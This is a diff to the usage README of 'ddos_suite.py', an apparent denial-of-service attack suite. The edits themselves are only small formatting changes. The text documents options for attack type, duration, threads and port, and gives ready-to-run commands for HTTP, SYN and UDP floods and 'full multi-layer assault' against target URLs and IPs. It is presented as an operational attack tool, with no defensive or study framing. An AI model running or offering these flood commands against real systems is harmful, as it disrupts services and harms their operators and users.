@@ -35,30 +35,36 @@ usage: python3 ddos_suite.py <target> [options]
 Argument	Description
 target	Target URL or IP (e.g., http://example.com or 192.168.1.1)
 
-# Options
+# Options:
 Flag	Default	Description
 -a, --attack	http_flood	Attack type (or layer3/layer4/layer7/all/full)
 -d, --duration	30	Duration in seconds
 -t, --threads	100	Number of concurrent threads
 --port	80	Target port (for IP targets)
---list	—	List all available attack modules
+--list	—	List all available attack module
 
 
 # Basic Examples
 Basic single attack (default: HTTP flood, 30s, 100 threads)
 ```python3 ddos_suite.py http://target.com```
+
 Specific attack with options
 ```python3 ddos_suite.py http://target.com -a syn_flood -d 60 -t 200```
+
 Layer-specific assault (all attacks in that layer simultaneously)
 ```python3 ddos_suite.py http://target.com -a layer3 -d 30```
 ```python3 ddos_suite.py http://target.com -a layer4 -d 60 -t 300```
 ```python3 ddos_suite.py http://target.com -a layer7 -d 45```
+
 Full multi-layer assault (L3+L4+L7 all at once)
 ```python3 ddos_suite.py https://target.com -a full -d 60 -t 500```
+
 Run all attacks sequentially
 ```python3 ddos_suite.py http://target.com -a all -d 20```
+
 Target by IP
 ```sudo python3 ddos_suite.py 192.168.1.100 -a udp_flood -d 30 --port 80```
+
 List available attacks
 ```python3 ddos_suite.py --list```
 
